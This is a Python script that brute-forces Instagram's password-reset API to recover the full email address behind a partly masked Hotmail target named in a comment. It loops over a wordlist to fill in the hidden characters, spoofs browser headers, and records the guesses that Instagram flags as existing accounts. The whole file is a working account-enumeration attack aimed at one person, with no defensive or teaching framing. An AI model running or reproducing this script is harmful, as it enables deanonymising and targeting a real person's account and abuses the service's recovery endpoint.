import requests


headers = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'dnt': '1',
    'dpr': '1',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/accounts/password/reset/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="119.0.2151.72", "Chromium";v="119.0.6045.159", "Not?A_Brand";v="24.0.0.0"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    'viewport-width': '482',
    'x-asbd-id': '129477',

}

# Target="b*******9@hotmail.com"

mailFront ="budahim"
mailEnd = "9@hotmail.com"

file_path = "mail999.txt"


with open(file_path, "r") as FileMAIL:
    lines = FileMAIL.readlines()

begin_line = 0
while begin_line < len(lines):
    Mails = lines[begin_line]
    mailList=Mails.replace("\n", "")

    data = {
        'email_or_username': f"{mailFront}{mailList}{mailEnd}",
    }

    response = requests.post(
        'https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/',
        headers=headers,
        data=data,
    )

    #print(response.text)
    if '"message":"No users found"' in response.text :
        print("No users found >>> ",f"{mailFront}{mailList}{mailEnd}")
        begin_line += 1 


    elif '"message":"checkpoint_required"' in response.text :
        print("checkpoint_required >>> ",f"{mailFront}{mailList}{mailEnd}")

        with open("checkpoint.txt", "a") as file:
            file.write(f"{mailFront}{mailList}{mailEnd}" + "\n")

        begin_line += 1 
    else:
        print("Error >>> ",f"{mailFront}{mailList}{mailEnd}")
      
        with open("Error.txt", "a") as file:
            file.write(f">>> line number: {begin_line}" + "\n" + f"{mailFront}{mailList}{mailEnd}" + "\n" + response.text + "\n")
  
        print(response.text)
        break
        #begin_line += 1 

